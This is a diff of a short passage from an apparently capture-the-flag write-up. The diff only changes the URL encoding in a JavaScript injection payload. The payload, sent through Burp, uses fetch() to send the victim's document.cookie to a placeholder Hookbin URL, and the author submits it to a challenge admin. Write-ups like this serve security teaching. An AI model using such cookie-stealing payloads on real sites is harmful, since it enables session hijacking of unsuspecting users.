@@ -70,7 +70,7 @@ To begin injecting, go to [Hookbin](https://hookbin.com) and generate a URL.
 Then use the following payload in Burp:
 
 ```js
-content[-fetch('https://YOURHOOKBINURL?cookie='%2bdocument.cookie,{'mode':'no-cors'})-]=-1-
+content[-fetch('https://YOURHOOKBINURL?cookie='%2Bdocument.cookie,{'mode':'no-cors'})-]=-1-
 ```
 
 I then navigated to the location of the request, and sent the paste to TJMIke. I then spent 30 minutes trying to figure out why that payload wasn't working. *(Spoiler: it was)*
